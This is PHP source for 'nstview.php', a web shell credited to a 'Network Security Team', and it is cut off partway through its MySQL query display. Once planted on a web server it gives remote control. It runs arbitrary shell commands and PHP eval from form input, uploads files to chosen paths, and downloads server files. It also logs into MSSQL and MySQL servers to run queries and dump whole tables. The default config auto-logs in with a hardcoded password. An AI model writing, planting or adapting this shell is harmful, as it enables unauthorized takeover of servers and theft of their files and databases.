<?php
# Network security team :: nst.void.ru
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@ob_start("ob_gzhandler"); # gzip for web, you can disable it if not supported.
@ini_set("display_errors","1");
#@ini_set("session.save_path","/home/some/folder/");
session_start();
@error_reporting(E_ALL & ~E_NOTICE);

# config
$password = "nst";
$show_mmsql_sys_tables = true;

# Login system
if(!isset($_SESSION['php_nst'])){
# you can comment this string out, and send POST request $_POST['php_nst'] with password like in variable $password
# and you will be logined in to nstview.
$_POST['php_nst'] = $password; # comment out this string to enable unique security. // #
}
#end of config



if($_POST['php_nst'] == $password){
$_SESSION['php_nst'] = base64_encode($password);
}

if($_SESSION['php_nst'] and
   $_SESSION['php_nst'] != base64_encode($password)){
session_destroy();
die;
}

if(!isset($_SESSION['php_nst'])){die;}


# functions
$ver = "3.1.Post";

function perm($perms){
if (($perms & 0xC000) == 0xC000) {
   $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
   $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
   $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
   $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
   $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
   $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
   $info = 'p';
} else {
   $info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
           (($perms & 0x0800) ? 's' : 'x' ) :
           (($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
           (($perms & 0x0400) ? 's' : 'x' ) :
           (($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
           (($perms & 0x0200) ? 't' : 'x' ) :
           (($perms & 0x0200) ? 'T' : '-'));
return $info;
}


if(@get_magic_quotes_gpc()){
foreach($_POST as $k=>$v){$_POST[$k] = stripslashes($v);}
foreach($_COOKIE as $k=>$v){$_COOKIE[$k] = stripslashes($v);}
}

if(preg_match("/:\\\/",getcwd())){
$os = "Windows";
}else{
$os = "Unix";
}



function file_get_contents_2($f){
return join('',file($f));
}

function show_error($str){
print "<font color=red><b>".$str."</b></font>";
}


function write($filename,$param,$text){
# param: w, a
$fp = fopen($filename,$param);
flock($fp,LOCK_EX);
fwrite($fp,$text);
fflush($fp);
flock($fp,LOCK_UN);
fclose($fp);
}


function get_size($size){
if ($size < 1024){$siz=$size.'B';}else{
if ($size < 1024*1024){$siz=number_format(($size/1024), 2, '.', '').'Kb';}else{
if ($size < 1000000000){$siz=number_format($size/(1024*1024), 2, '.', '').'Mb';}else{
if ($size < 1000000000000){$siz=number_format($size/(1024*1024*1024), 2, '.', '').'Gb';}
}}}
return $siz;
}


function my_ip(){
if($_SERVER["HTTP_CLIENT_IP"]){return $_SERVER["HTTP_CLIENT_IP"];}
if($_SERVER["HTTP_X_FORWARDED_FOR"]){return $_SERVER["HTTP_X_FORWARDED_FOR"];}
return $_SERVER['REMOTE_ADDR'];
}


if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="phpinfo"){
phpinfo();
die;
}
}


if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="download"){
header("Content-disposition: attachment; filename=\"".$_POST['nst_tmp2']."\";");
header("Content-length: ".filesize($_POST['nst_tmp3']));
header("Content-Type: application/octet-stream");
header("Expires: 0");
readfile($_POST['nst_tmp3']);
die;
}
}




function mssql_dump_table($adr, $login, $pass, $db, $table){
mssql_connect($adr, $login, $pass);
mssql_select_db($db);
$texttypes = array('binary','char','nchar','varchar','nvarchar');
$masterquery = '';
$tablequery = ('CREATE TABLE ' . $table);
$columns = array();
$tablesep = explode('.',$table);
$colquery = ('sp_columns @table_name = N\'' . $tablesep[0] . '\'');
$column_query = mssql_query($colquery);
if(mssql_num_rows($column_query) > 0) $tablequery .= ' (';
while($row = mssql_fetch_assoc($column_query)){
$colspec = ($row['COLUMN_NAME'] . ' ' . strtoupper($row['TYPE_NAME']));
if(in_array($row['TYPE_NAME'],$texttypes)) $colspec .= ('(' . $row['PRECISION'] . ')');
if(!$row['NULLABLE']) $colspec .= ' NOT NULL';
if($row['COLUMN_DEF'] != '') $colspec .= (' DEFAULT ' . $row['COLUMN_DEF']);
$tablequery .= (', ' . $colspec);}
if(mssql_num_rows($column_query) > 0) $tablequery .= ')';
$tablequery = str_replace('(, ','(',$tablequery);
$masterquery .= ($tablequery . ';' . "\r\n");
$table_query = mssql_query('SELECT * FROM ' . $table . ';');
while($row = mssql_fetch_assoc($table_query)){
if(!isset($schema)){
$schema = array();
foreach($row AS $key => $value) $schema[] = $key;}
$values = array();
foreach($schema AS $col)
if(is_numeric($row[$col]))
$values[] = ('\'' . str_replace('\'','\'\'',$row[$col]) . '\'');
else if(!empty($_POST['base64']))
$values[] = ('\'' . base64_encode(str_replace('\'','\'\'',$row[$col])) . '\'');
else
$values[] = ('\'' . str_replace('\'','\'\'',$row[$col]) . '\'');
$masterquery .= ('INSERT INTO ' . $table . ' (' . implode(',',$schema) . ') VALUES (' . implode(',',$values) . ');' . "\r\n");}
$masterquery = rtrim($masterquery);
header('Content-type: application/x-download');
header('Content-Disposition: attachment; filename="'.$table.'.txt"');
header('Content-Length: '.strlen($masterquery));
print $masterquery;
die;
}




function mysql_dump_table($adr, $login, $pass, $db, $table){
mysql_connect($adr, $login, $pass, $db, $table);
mysql_select_db($db);
$que = mysql_query("SELECT * FROM `".$table."`");
if(mysql_num_rows($que)>0){
while($row = mysql_fetch_assoc($que)){
$keys = join("`, `", array_keys($row));
$values = array_values($row);
foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
$values = implode("', '", $values);
$sql .= "INSERT INTO `$tbl`(`$keys`) VALUES ('".$values."');\r\n";
}
}
header('Content-type: application/x-download');
header('Content-Disposition: attachment; filename="'.$table.'.txt"');
header('Content-Length: '.strlen($sql));
print $sql;
die;
}




if($_POST['nst_tmp4']=="dump_table"){
mssql_dump_table(base64_decode($_SESSION['ma']), base64_decode($_SESSION['ml']), base64_decode($_SESSION['mp']), $_POST['nst_tmp3'], $_POST['nst_tmp5']);
}


if($_POST['nst_tmp4']=="dump_table_my"){
mysql_dump_table(base64_decode($_SESSION['ma_my']), base64_decode($_SESSION['ml_my']), base64_decode($_SESSION['mp_my']), $_POST['nst_tmp3'], $_POST['nst_tmp5']);
}





?>
<title></title>
<style>
body, td{
font-family:verdana;
font-size:11px;
font-weight:bold;
}

input,select,textarea{
font-family:verdana;
font-size:11px;
background-color:#A4D5FF;
border-color:E3E3E3;
border-style:inset;
border-width:1px;
color:#001D34;
}

.border{
border:1px dashed #4C4C4C;
}

a:visited {
color: #474CFF;
text-decoration: none;
}
a:hover {
color: #FF474C;
text-decoration: none;
}
a:link {
color: #474CFF;
text-decoration: none;
}
a:active {
color: #474CFF;
text-decoration: underline;
}
</style>

<script php_expert=1>
function ifenter(event){
var keyCode = event.keyCode ? event.keyCode : event.which ? event.which : event.charCode;
if (keyCode == 13) {
return true;
}else{
return false;
}
}

function nst_goto(to){
document.getElementById("nst_cmd").value = "goto";
document.getElementById("nst_tmp").value = to;
}

function nst_submit(){
document.getElementById("nst_form").submit();
}

function set_value(id, v){
document.getElementById(id).value = v;
}

function nst_chdir(dir){
document.getElementById("nst_cmd").value = "chdir";
document.getElementById("nst_tmp").value = dir;
nst_submit()
}

function nst_cmd_ex(event){
if(ifenter(event)){
nst_goto("nst1");
nst_submit();
}
}

function nst_upload(){
nst_goto("upload");
nst_submit();
}

function nst_download(f, p){
nst_goto("download");
set_value("nst_tmp2", f);
set_value("nst_tmp3", p);
nst_submit();
}

function nst_view(f, dir){
nst_goto("view");
set_value("nst_tmp2", f);
set_value("nst_tmp3", "nst_view_chdir");
set_value("nst_tmp4", dir);
nst_submit();
}

function nst_mssql_login(){
nst_goto("mssql");
nst_submit();
}

function nst_mssql_select_db(db){
nst_goto("ms_dbs");
set_value("nst_tmp2", "list_tables");
set_value("nst_tmp3", db);
set_value("nst_tmp4", "");
nst_submit();
}

function nst_mssql_select_table(db, table){
nst_goto("ms_dbs");
set_value("nst_tmp2", "list_tables");
set_value("nst_tmp3", db);
set_value("nst_tmp4", "show_table_content");
set_value("nst_tmp5", table);
if(document.getElementById("sql_q")){
document.getElementById("sql_q").value="SELECT TOP 30 * FROM ["+table+"];";
}
nst_submit();
}

function nst_mssql_run_query(db, table){
nst_goto("ms_dbs");
set_value("nst_tmp2", "list_tables");
set_value("nst_tmp3", db);
set_value("nst_tmp4", "show_table_content");
set_value("nst_tmp5", table);
nst_submit();
}

function nst_mssql_dump_table(db, table){
nst_goto("ms_dbs");
set_value("nst_tmp2", "list_tables");
set_value("nst_tmp3", db);
set_value("nst_tmp4", "dump_table");
set_value("nst_tmp5", table);
nst_submit();
}

function nst_run_eval(){
nst_goto("tools");
nst_submit();
}

function nst_mysql_login(){
nst_goto("mysql");
nst_submit();
}

function nst_mysql_select_db(db){
nst_goto("my_dbs");
set_value("nst_tmp2", "list_tables_my");
set_value("nst_tmp3", db);
set_value("nst_tmp4", "");
nst_submit();
}

function nst_mysql_select_table(db, table){
nst_goto("my_dbs");
set_value("nst_tmp2", "list_tables_my");
set_value("nst_tmp3", db);
set_value("nst_tmp4", "show_table_content_my");
set_value("nst_tmp5", table);
if(document.getElementById("sql_q")){
document.getElementById("sql_q").value="SELECT * FROM "+table+" LIMIT 0,30";
}
nst_submit();
}

function nst_mysql_run_query(db, table){
nst_goto("my_dbs");
set_value("nst_tmp2", "list_tables_my");
set_value("nst_tmp3", db);
set_value("nst_tmp4", "show_table_content_my");
set_value("nst_tmp5", table);
nst_submit();
}

function nst_mysql_dump_table(db, table){
nst_goto("my_dbs");
set_value("nst_tmp2", "list_tables_my");
set_value("nst_tmp3", db);
set_value("nst_tmp4", "dump_table_my");
set_value("nst_tmp5", table);
nst_submit();
}
</script>

<?php
# change dir
if($_POST['nst_cmd']=="chdir"){
$d = $_POST['nst_tmp'];
}else{

if($_POST['nst_cur_dir']){$d = $_POST['nst_cur_dir'];}else{$d = getcwd();}

}
$d = str_replace("\\","/", $d);
$d = str_replace("//","/", $d);

if(preg_match("/\.\.$/", $d)){
$d = preg_replace("/\/[^\/]+\/\.\.$/", "", $d);
}

$d = $d."/";



# path to go
preg_match_all("/([^\/]+)\//", $d, $m);
$s = sizeof($m[0]);
if($os=="Unix"){
$path_chdir = "/";
}
for($i=0; $i<$s; $i++){
$path_chdir .= $m[0][$i];

if($os=="Windows"){
if($i!=0){$sl="/";}else{$sl="";}
}else{
if($i==0){$path_to_go="<a href='#' onclick='nst_chdir(\"/\"); nst_submit();'>/</a><a href='#' onclick='nst_chdir(\"".$path_chdir."\"); nst_submit();'>".str_replace("/","",$m[0][$i])."</a>";}else{$sl="/";}
}

if($os=="Unix"){
if($i!=0){
$path_to_go .= "<a href='#' onclick='nst_chdir(\"".$path_chdir."\"); nst_submit();'>".$sl.str_replace("/","",$m[0][$i])."</a>";
}
}else{
$path_to_go .= "<a href='#' onclick='nst_chdir(\"".$path_chdir."\"); nst_submit();'>".$sl.str_replace("/","",$m[0][$i])."</a>";
}
}

if(empty($path_to_go) and $os=="Unix"){$path_to_go="<a href='#' onclick='nst_chdir(\"/\"); nst_submit();'>/</a>";}


# home dir
$home_dir = getcwd();
$home_dir = str_replace("\\","/", $home_dir);
$home_dir = str_replace("//","/", $home_dir);


?>



<table align=center border=0 width=650 bgcolor=#D7FFA8 class=border>
<form method=post id=nst_form enctype=multipart/form-data>
<tr><td align=center>
<input type=hidden id=nst_cmd name=nst_cmd>
<input type=hidden id=nst_tmp name=nst_tmp>
<input type=hidden id=nst_tmp2 name=nst_tmp2>
<input type=hidden id=nst_tmp3 name=nst_tmp3>
<input type=hidden id=nst_tmp4 name=nst_tmp4>
<input type=hidden id=nst_tmp5 name=nst_tmp5>
<input type=hidden id=nst_cur_dir name=nst_cur_dir value='<?php print str_replace("//","/",$d); ?>'>
<font size=2>
<a href='http://nst.void.ru' target=_blank>NETWORK SECURITY TEAM<br>nstview.php v<?php print $ver;?></a></td></tr>
<tr><td>

<table border=0>
<tr><td><font face=wingdings size=2 color=#FF0000>0</font> <?php print $path_to_go; ?></td></tr>
</table>

<table border=0>
<tr>
<td>Your IP: [<font color=#5F3CC1><?php print my_ip(); ?></font>]</td>
<td>Server IP: [<font color=#5F3CC1><?php print gethostbyname($_SERVER["HTTP_HOST"]); ?></font>]</td>
<td>Server Address: [<font color=#5F3CC1><?php print $_SERVER["HTTP_HOST"]; ?></font>]</td>
</tr>
</table>
<center>
<?php
if($os=="Windows"){
print "<font face=wingdings size=2 color=red><</font>";        
for($i=65; $i<=90; $i++){
print "<a href='#' onclick='nst_chdir(\"".chr($i).":\"); nst_submit();'>".chr($i)."</a> ";
}
}
?>
</center>
<table border=0>
<tr>
<td>[<a href='#' onclick='nst_chdir("<?php print $home_dir; ?>"); nst_submit();'>Home</a>]</td>
<td>[<a href='#' onclick='nst_goto("nst1"); nst_submit();'>nsT</a>]</td>
<td>[<a href='#' onclick='nst_goto("upload"); nst_submit();'>Upload</a>]</td>
<td>[<a href='#' onclick='nst_goto("tools"); nst_submit();'>Tools</a>]</td>
<td>[<a href='#' onclick='nst_goto("mssql"); nst_submit();'>M$SQL</a>]</td>
<td>[<a href='#' onclick='nst_goto("mysql"); nst_submit();'>MySQL</a>]</td>
<td>[<a href='#' onclick='nst_goto("phpinfo"); nst_submit();'>PHPinfo</a>]</td>
</tr>
</table>



<?php
# nst1 function
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="nst1"){

if(!$_POST['nst_cur_dir']){
$cmd_dir = getcwd();
}else{
$cmd_dir = $_POST['nst_cur_dir'];
}
chdir($cmd_dir);

?>
<center>
<br>
Enter command:
<br>
<input name=cmd size=60 autocomplete=off onKeyPress='nst_cmd_ex(event);'><br>
Current directory:<br>
<input name=cmd_dir size=60 autocomplete=off onKeyPress='nst_cmd_ex(event);' value='<?php print $cmd_dir;?>'>
<?php
if($_POST['cmd']){
htmlspecialchars($_POST['cmd']);
?>
</center>
<pre><font size=3 face=verdana>
<?php
$cmd = $_POST['cmd'];
print `$cmd`;
?>
</pre>
<?php
}
}
}
#end of nst1 function



# upload function
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="upload"){

?>
<center>
<br>
Select file to upload:
<br>
<input type=file name=f><br>
<br>
Write path where to upload:
<br>
<input name=wup autocomplete=off size=60 value='<?php print $_POST['nst_cur_dir']; ?>'><br>
<br>
<input type=button onclick='nst_upload()' value='Upload file'>
<br>
<?php
if($_POST['wup'] and !empty($_FILES['f']['name'])){
if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_POST['wup']."/".$_FILES['f']['name'])){
print "<font color=red><b>Cant upload, maybe check chmod ? or folder exists ?</font></b>";
}else{
print "<font color=green><b>OK uploaded to:<br>".str_replace("//","/",str_replace("\\","/",str_replace("//","/",$_POST['wup']."/".$_FILES['f']['name'])));
}
}
}
}
#end of upload function




# view files function
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="view"){
preg_match("/\/([^\/]+)$/", $_POST['nst_tmp2'], $m);

print "<br><center>
<a href='#' onclick='nst_download(\"".$m[1]."\",\"".$_POST['nst_tmp2']."\");'><font color=#FF474C>:: DOWNLOAD THIS FILE ::</font></a>
</center>

<pre><font size=3 face=verdana>";
highlight_file($_POST['nst_tmp2']);
}
}
#end of view files function



# directory listing function
if(($_POST['nst_cmd']=="chdir" or !$_POST) or $_POST['php_nst']){

$dirs  = array();
$files = array();
$dh = @opendir($d) or die("<center>Permission Denied or Folder/Disk does not exist</center>");
while (!(($f = readdir($dh)) === false)) {
if (is_dir($d."/".$f)) {
$dirs[]=$f;
}else{
$files[]=$f;
}
sort($dirs);
sort($files);
}


print "<table border=0 width=100%>
<tr bgcolor=#9C9FFF align=center>
<td>Filename</td>
<td>Tools</td>
<td>Size</td>
<td>Owner/Group</td>
<td>Pemrs</td></tr>";

$all_files = array_merge($dirs, $files);

$i=0;
foreach($all_files as $name){
if($i%2){
$c="#D1D1D1";
}else{
$c="";
}

$perms = @fileperms($d."/".$name);
$owner = @fileowner($d."/".$name);
$group = @filegroup($d."/".$name);

if($os=="Unix"){
if(function_exists("posix_getpwuid") and function_exists("posix_getgrgid")){
$fileownera=@posix_getpwuid($owner);
$owner=$fileownera['name'];
$groupinfo = @posix_getgrgid($group);
$group=$groupinfo['name'];
}
}
$perms=perm($perms);

if(is_dir($d."/".$name)){
$ico = 0;
$ico_c = "#800080";
$options = "DIR";
$size = "";
$todo = "nst_chdir(\"".$d."/".$name."\"); nst_submit();";
}else{
$ico = 2;
$ico_c = "#FF474C";
$options = "<a href='#' onclick='nst_download(\"".$name."\",\"".$d."/".$name."\"); return false;' title='Download'>D</a>";
$size = get_size(@filesize($d."/".$name));
preg_match("/^(.*?)\/([^\/]+)$/is", $d."/".$name, $m);
$todo = "nst_view(\"".$d."/".$name."\", \"".$m[1]."\");";
}

print "<tr bgcolor='".$c."'
           onMouseOver=\"this.style.background='#56B2F9';\"
           onMouseOut=\"this.style.background='".$c."';\">

<td onclick='".$todo."' width=100%><label><font face=wingdings size=2 color=".$ico_c.">".$ico."</font> ".$name."</td>


<td align=center>".$options."</td>

<td align=center width=60 nowrap><font color=#343AFF>".$size."</td>
<td align=center width=95 nowrap align=center>".$owner."/".$group."</td>
<td align=center width=95 nowrap>".$perms."</td></tr>";
$i++;
}
?>
</table>
<?php
}
#end of directory listing function




# tools function
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="tools"){
?>

<center>
<br>
Enter php code:
<br>
&lt;?php<Br>
<textarea name=php_ev_c style='width:500px; height:200px;'><?php print $_POST['php_ev_c'];?></textarea><br>
?&gt;<br>
<input type=button value='Run php code' onclick='nst_run_eval();'>
<?php
if($_POST['php_ev_c']){
?>
</center><br>
<pre><font size=3 face=verdana color=green>
<?php
print "&lt;?\r\n".$_POST['php_ev_c']."\r\n?&gt;<br>";
print "<font color=#FF474C><br>";
eval($_POST['php_ev_c']);
?>
</pre>
<?php
}
}
}
#end of nst1 function





################### mssql ##################



# mssql login
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="mssql"){
?>
<center>
<br>
Microsoft SQL Server manager:<br>
<br>
Address:<br>
<input name=m_adr value=localhost autocomplete=off><br>
Login:<br>
<input name=m_login value=sa autocomplete=off><br>
Password:<br>
<input name=m_pass autocomplete=off><br>
<input type=button onclick='nst_mssql_login()' value='Login'>
<br>
<?php
if($_POST['m_adr'] and $_POST['m_login']){
if(!@mssql_connect($_POST['m_adr'], $_POST['m_login'], $_POST['m_pass'])){
show_error("Cant connect to mssql server!<br>(".mssql_get_last_message().")");
unset($_SESSION['ma']);
unset($_SESSION['ml']);
unset($_SESSION['mp']);
}else{
$_SESSION['ma']=base64_encode($_POST['m_adr']);
$_SESSION['ml']=base64_encode($_POST['m_login']);
$_SESSION['mp']=base64_encode($_POST['m_pass']);

print "<br>Connected !<br><br><a href='#' onclick='nst_goto(\"ms_dbs\"); nst_submit(); return false;'>Show data bases</a>";
}
}

}
}
#end of mssql login


if($_SESSION['ma'] and $_SESSION['ml'] and $_SESSION['mp']){
if(!@mssql_connect(base64_decode($_SESSION['ma']), base64_decode($_SESSION['ml']), base64_decode($_SESSION['mp']))){
show_error("Cant connect to mssql server!<br>(".mssql_get_last_message().")");
unset($_SESSION['ma']);
unset($_SESSION['ml']);
unset($_SESSION['mp']);
}
}


# mssql db's
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="ms_dbs"){


if(!$q = @mssql_query("sp_helpdb")){show_error("Cant list databases!<br>(".mssql_get_last_message().")");}

print "<br><table border=0 align=center>
<tr align=center bgcolor=#7CC2FF><td>DB Name</td><td>Size</td><td>Owner</td><td>Created</td></tr>";
while($row = mssql_fetch_array($q)){

if($_POST['nst_tmp3']==$row['name']){
$tc="#FF47FF";
}else{
$tc="";
}

print "<tr onMouseOver='this.style.background=\"#FFFEC8\";' onMouseOut='this.style.background=\"#A2D8FF\";' bgcolor=\"#A2D8FF\">
        <td><a href='#' onclick='nst_mssql_select_db(\"".$row['name']."\"); return false;'><font color=".$tc.">".$row['name']."</td>
        <td>".$row['db_size']."</td>
        <td align=center>".$row['owner']."</td>
        <td>".$row['created']."</td>
       </tr>";
}
print "</table>";




}
}
#end of mssql db's



# mssql list tables
if($_POST['nst_tmp2']=="list_tables"){
if(!@mssql_select_db($_POST['nst_tmp3'])){show_error("Cant select db!<br>(".mssql_get_last_message().")");}
if(!$q = @mssql_query('sp_tables')){show_error("Cant list tables!<br>(".mssql_get_last_message().")");}

print "<br><table border=0 align=center>
<tr align=center bgcolor=#7CC2FF><td>Table name</td><td>Owner</td><td>Download</td></tr>";
while($row = mssql_fetch_array($q)){

if($_POST['nst_tmp5']==$row['TABLE_NAME']){
$tc="#FF47FF";
}else{
$tc="";
}

if($row['TABLE_TYPE'] == 'TABLE' and $row['TABLE_NAME'] != 'dtproperties'){
$record_query = mssql_query("SELECT count(*) AS itemcount FROM [".$row['TABLE_NAME']."]");
$record_array = mssql_fetch_array($record_query);
$records = $record_array['itemcount'];

print "<tr onMouseOver='this.style.background=\"#FFFEC8\";' onMouseOut='this.style.background=\"#A2D8FF\";' bgcolor=\"#A2D8FF\">
        <td nowrap><a href='#' onclick='nst_mssql_select_table(\"".$_POST['nst_tmp3']."\",\"".$row['TABLE_NAME']."\"); return false;'><font color=".$tc.">".$row['TABLE_NAME']." (".$records.")</td>
        <td align=center>".$row['TABLE_OWNER']."</td>
        <td align=center><a href='#' onclick='nst_mssql_dump_table(\"".$_POST['nst_tmp3']."\",\"".$row['TABLE_NAME']."\"); return false;'>Dump</a></td>
       </tr>";
}else{

if($show_mmsql_sys_tables == true){
if(!empty($tc)){$stc=$tc;}else{$stc="red";}
print "<tr onMouseOver='this.style.background=\"#FFFEC8\";' onMouseOut='this.style.background=\"#A2D8FF\";' bgcolor=\"#A2D8FF\">
        <td nowrap><a href='#' onclick='nst_mssql_select_table(\"".$_POST['nst_tmp3']."\",\"".$row['TABLE_NAME']."\"); return false;'><font color=".$stc.">".$row['TABLE_NAME']."</td>
        <td align=center>".$row['TABLE_OWNER']."</td>
        <td align=center><a href='#' onclick='nst_mssql_dump_table(\"".$_POST['nst_tmp3']."\",\"".$row['TABLE_NAME']."\"); return false;'>Dump</a></td>
       </tr>";
}

}

}
print "</table>";

}
#end of list tables





# mssql show table content
if($_POST['nst_tmp4']=="show_table_content"){


if(!$_POST['sql_q']){
$sql_q = "SELECT TOP 30 * FROM [".$_POST['nst_tmp5']."]";
}else{
$sql_q = $_POST['sql_q'];
}


print "<table border=0 align=center>
<tr><td><a name=sql_q></a>Type SQL to execute:</td></tr>
<tr><td><textarea name=sql_q style='width:500px; height:100px;' id=sql_q>".$sql_q."</textarea><br>
<input type=button value='Run sql query' onclick=\"nst_mssql_run_query('".$_POST['nst_tmp3']."','".$_POST['nst_tmp5']."');\">  Fast SQL:
<input type=button onclick='document.getElementById(\"sql_q\").value=\"SELECT TOP 30 * FROM [".$_POST['nst_tmp5']."];\"' value=Select>
<input type=button onclick='document.getElementById(\"sql_q\").value=\"INSERT INTO ".$_POST['nst_tmp5']."\\n(field1, field2, field3)\\nVALUES (&#039;value1&#039;,&#039;value2&#039;,&#039;value3&#039;);\"' value=Insert>
<input type=button onclick='document.getElementById(\"sql_q\").value=\"UPDATE ".$_POST['nst_tmp5']."\\nSET field1=&#039;value1&#039;, field2=&#039;value2&#039;, field3=&#039;value3&#039;\\nWHERE field1=&#039;abc&#039;;\"' value=Update>
<input type=button onclick='document.getElementById(\"sql_q\").value=\"DELETE FROM ".$_POST['nst_tmp5']."\\nWHERE field1=&#039;abc&#039;;\"' value='Delete'>
</tr><td>
</table>";


if(!$q = @mssql_query($sql_q)){show_error("<center>Query failed!<br>(".mssql_get_last_message().")");}else{

if(preg_match("/SELECT\s/is", $sql_q)){

$fields = array();
print "<br><table border=0 align=center>";
print "<tr bgcolor=#7CC2FF>";
while($row = mssql_fetch_field($q)){
print "<td>".$row->name."</td>";
$fields[] = $row->name;
}
print "</tr>";



while($row = mssql_fetch_array($q)){
print "<tr onMouseOver='this.style.background=\"#FFFEC8\";' onMouseOut='this.style.background=\"#A2D8FF\";' bgcolor=\"#A2D8FF\">";
$i=0;
foreach($row as $key=>$value){
if($i%2){
print "<td nowrap>".$value."</td>";
}
$i++;
}
print "</tr>";
}


print "</table>";

}else{
print "
<br>
<table align=center>
<tr><td>Success!</td></tr>
<tr><td nowrap><font color=green><pre>".$sql_q."</td></tr>
</table>";
}
}
}
#end of mssql show table content












################ mysql ####################




# mysql login
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="mysql"){
?>
<center>
<br>
MySQL Server manager:<br>
<br>
Address:<br>
<input name=m_adr_my value=localhost autocomplete=off><br>
Login:<br>
<input name=m_login_my value=root autocomplete=off><br>
Password:<br>
<input name=m_pass_my autocomplete=off><br>
<input type=button onclick='nst_mysql_login()' value='Login'>
<br>
<?php
if($_POST['m_adr_my'] and $_POST['m_login_my']){
if(!@mysql_connect($_POST['m_adr_my'], $_POST['m_login_my'], $_POST['m_pass_my'])){
show_error("Cant connect to mysql server!<br>(".mysql_error().")");
}else{
$_SESSION['ma_my']=base64_encode($_POST['m_adr_my']);
$_SESSION['ml_my']=base64_encode($_POST['m_login_my']);
$_SESSION['mp_my']=base64_encode($_POST['m_pass_my']);

print "<br>Connected !<br><br><a href='#' onclick='nst_goto(\"my_dbs\"); nst_submit(); return false;'>Show data bases</a>
<br><br>
MySQL version: ".mysql_get_server_info()."<br>";
}
}

}
}
#end of mysql login


if($_SESSION['ma_my'] and $_SESSION['ml_my'] and $_SESSION['mp_my']){
if(!@mysql_connect(base64_decode($_SESSION['ma_my']), base64_decode($_SESSION['ml_my']), base64_decode($_SESSION['mp_my']))){
show_error("Cant connect to mysql server!<br>(".mysql_error().")");
unset($_SESSION['ma_my']);
unset($_SESSION['ml_my']);
unset($_SESSION['mp_my']);
}
}


# mysql db's
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="my_dbs"){


if(!$q = mysql_list_dbs()){show_error("Cant list databases!<br>(".mysql_error().")");}

print "<br><table border=0 align=center>
<tr align=center bgcolor=#7CC2FF><td>DB Name</td></tr>";
while($row = mysql_fetch_array($q)){

if($_POST['nst_tmp3']==$row[0]){
$tc="#FF47FF";
}else{
$tc="";
}

print "<tr onMouseOver='this.style.background=\"#FFFEC8\";' onMouseOut='this.style.background=\"#A2D8FF\";' bgcolor=\"#A2D8FF\">
        <td align=center><a href='#' onclick='nst_mysql_select_db(\"".$row['Database']."\"); return false;'><font color=".$tc.">".$row['Database']."</td>
       </tr>";
}
print "</table>";


}
}
#end of mysql db's



# mysql list tables
if($_POST['nst_tmp2']=="list_tables_my"){
if(!$q = @mysql_list_tables($_POST['nst_tmp3'])){show_error("Cant list tables!<br>(".mysql_error().")");}

print "<br><table border=0 align=center>
<tr align=center bgcolor=#7CC2FF><td>Table name</td><td>Download</td></tr>";
while($row = mysql_fetch_array($q)){

if($_POST['nst_tmp5']==$row[0]){
$tc="#FF47FF";
}else{
$tc="";
}

$c = mysql_query("SELECT COUNT(*) FROM `".$row[0]."`");
$record_array = mysql_fetch_array($c);
$records = $record_array[0];

print "<tr onMouseOver='this.style.background=\"#FFFEC8\";' onMouseOut='this.style.background=\"#A2D8FF\";' bgcolor=\"#A2D8FF\">
        <td nowrap><a href='#' onclick='nst_mysql_select_table(\"".$_POST['nst_tmp3']."\",\"".$row[0]."\"); return false;'><font color=".$tc.">".$row[0]." (".$records.")</td>
        <td align=center><a href='#' onclick='nst_mysql_dump_table(\"".$_POST['nst_tmp3']."\",\"".$row[0]."\"); return false;'>Dump</a></td>
       </tr>";
}
print "</table>";

}
#end of list tables





# mysql show table content
if($_POST['nst_tmp4']=="show_table_content_my"){


if(!$_POST['sql_q']){
$sql_q = "SELECT * FROM ".$_POST['nst_tmp5']." LIMIT 0,30";
}else{
$sql_q = $_POST['sql_q'];
}


print "<table border=0 align=center>
<tr><td><a name=sql_q></a>Type SQL to execute:</td></tr>
<tr><td><textarea name=sql_q style='width:500px; height:100px;' id=sql_q>".$sql_q."</textarea><br>
<input type=button value='Run sql query' onclick=\"nst_mysql_run_query('".$_POST['nst_tmp3']."','".$_POST['nst_tmp5']."');\">  Fast SQL:
<input type=button onclick='document.getElementById(\"sql_q\").value=\"SELECT * FROM ".$_POST['nst_tmp5']." LIMIT 0,30\"' value=Select>
<input type=button onclick='document.getElementById(\"sql_q\").value=\"INSERT INTO ".$_POST['nst_tmp5']."\\n(field1, field2, field3)\\nVALUES (&#039;value1&#039;,&#039;value2&#039;,&#039;value3&#039;);\"' value=Insert>
<input type=button onclick='document.getElementById(\"sql_q\").value=\"UPDATE ".$_POST['nst_tmp5']."\\nSET field1=&#039;value1&#039;, field2=&#039;value2&#039;, field3=&#039;value3&#039;\\nWHERE field1=&#039;abc&#039;;\"' value=Update>
<input type=button onclick='document.getElementById(\"sql_q\").value=\"DELETE FROM ".$_POST['nst_tmp5']."\\nWHERE field1=&#039;abc&#039;;\"' value='Delete'>
</tr><td>
</table>";


if(!$q = @mysql_query($sql_q)){show_error("<center>Query failed!<br>(".mysql_error().")");}else{

if(preg_match("/SELECT\s/is", $sql_q)){

$fields = array();
print "<br><table border=0 align=center>";
print "<tr bgcolor=#7CC2FF>";
